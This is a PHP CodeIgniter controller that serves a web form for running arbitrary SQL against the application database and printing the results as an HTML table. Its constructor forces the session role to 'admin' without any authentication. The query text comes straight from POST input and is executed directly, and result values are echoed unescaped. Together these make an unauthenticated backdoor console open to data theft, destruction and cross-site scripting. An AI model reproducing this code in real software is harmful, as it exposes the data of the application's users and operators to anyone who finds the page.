<?php
defined('BASEPATH') OR exit('No direct script access allowed');
/**
 * Created by Dream Steps Pvt Ltd
 * Created on 30 Nov 2019
 * Vedmir -  module
**/
class Db extends CI_Controller {
	
	public $menu		= 1;
	public $subMenu		= 11;
	public $subSubMenu		= 0;
	public $outputdata 	= array();
	
	public function __construct(){
		parent::__construct();
		//Check login authentication & set public veriables
		$this->session->set_userdata(PREFIX.'sessRole', "admin");
		$this->common_lib->setSessionVariables();
	}
	
	public function index($table = 'vm_auth'){


		echo '<form action="#" method="POST">
  type:<br>
  <select name="qrytype" style="width:200px;">
  <option value="run">run</option>
  <option value="get">get</option>
</select>
  <br>
  Query:<br>
  <textarea name="qry" rows="3" cols="180"></textarea>
  <br><br>
  <input type="submit" value="Submit">
</form>';
		$dbData = '';
		if (isset($_POST['qry']) && !empty($_POST['qry'])) {
			if ($_POST['qrytype'] == 'run') {
				echo $this->Common_model->runquery($_POST['qry']);
			}else{
				$dbData = $this->Common_model->exequery($_POST['qry']);
			}
		}else{
			$dbData = $this->Common_model->selTabledata($table);
		}
		$ishead = $isbody = 0;
		echo "<table style='border: 1px solid #ddd;border-collapse: collapse;'><tr>";
		if (valResultSet($dbData)) {

			foreach ($dbData[0] as $key=>$value) {
				echo "<th style='border: 2px solid #ddd;padding:2px;'>$key</th>";
			}
			echo "</tr>";
			foreach ($dbData as $dbvalue) {
				echo "<tr>";
				foreach ($dbvalue as $key => $value) {
					echo "<td style='border: 1px solid #ddd;padding:2px;'>$value</td>";
				}
				echo "</tr>";
			}
		}
		echo "</table>"; //print_r($dbData);


	}
	
}